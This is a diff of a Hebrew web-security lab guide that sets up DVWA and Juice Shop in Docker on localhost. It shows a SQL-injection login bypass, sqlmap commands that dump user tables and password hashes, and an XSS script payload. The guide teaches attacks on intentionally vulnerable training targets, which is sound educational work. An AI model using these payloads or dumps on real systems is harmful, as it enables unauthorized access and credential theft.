@@ -10,9 +10,11 @@
 
 **9.1**
 ```bash
-sudo docker run -d -p 3000:3000 bkimminich/juice-shop
-# גלוש ל- http://localhost:3000
+sudo apt install docker.io -y && sudo systemctl start docker
+sudo docker run -d -p 80:80   vulnerables/web-dvwa      # DVWA  → http://localhost
+sudo docker run -d -p 3000:3000 bkimminich/juice-shop   # Juice Shop → http://localhost:3000
 ```
+ב-DVWA: התחבר `admin`/`password` → "Create/Reset Database" → הגדר **DVWA Security = Low**. עכשיו שני היעדים מוכנים.
 
 **9.2** — Burp: `Proxy → Intercept on`; Firefox עם Proxy `127.0.0.1:8080`. בצע התחברות — הבקשה תיתפס עם הפרמטרים `email`/`password` (Juice Shop) או `username`/`password` (DVWA).
 
@@ -25,13 +27,14 @@ sudo docker run -d -p 3000:3000 bkimminich/juice-shop
 **9.4** — בשדה המשתמש הזן `' OR '1'='1' -- ` (סיסמה כלשהי).
 **למה זה עובד:** השאילתה הופכת ל-`SELECT * FROM users WHERE username='' OR '1'='1' -- '...`. התנאי `'1'='1'` תמיד אמת, וה-`-- ` מבטל את בדיקת הסיסמה → מתחברים כמשתמש הראשון (לרוב admin).
 
-**9.5**
+**9.5** — על **DVWA** (עמוד SQL Injection). הדרך הקלה: ב-Burp שמור את הבקשה לקובץ `request.txt` (היא כוללת את ה-Cookie וה-session), ותן אותה ל-sqlmap:
 ```bash
-sqlmap -u "http://target/rest/products/search?q=1" --batch --dbs
-sqlmap -u "http://target/..." -D <db> --tables
-sqlmap -u "http://target/..." -D <db> -T Users --dump
-# או מבקשה שנשמרה מ-Burp:
-sqlmap -r request.txt --batch --dump
+sqlmap -r request.txt --batch --dbs          # רשימת בסיסי הנתונים
+sqlmap -r request.txt --batch -D dvwa --tables
+sqlmap -r request.txt --batch -D dvwa -T users --dump   # שולף שמות משתמש + hashes
+# חלופה ישירה (עם ה-Cookie מהדפדפן):
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+       --cookie="PHPSESSID=<...>; security=low" --batch --dbs
 ```
 
 **9.6** — הזרקת `<script>alert('XSS')</script>`:
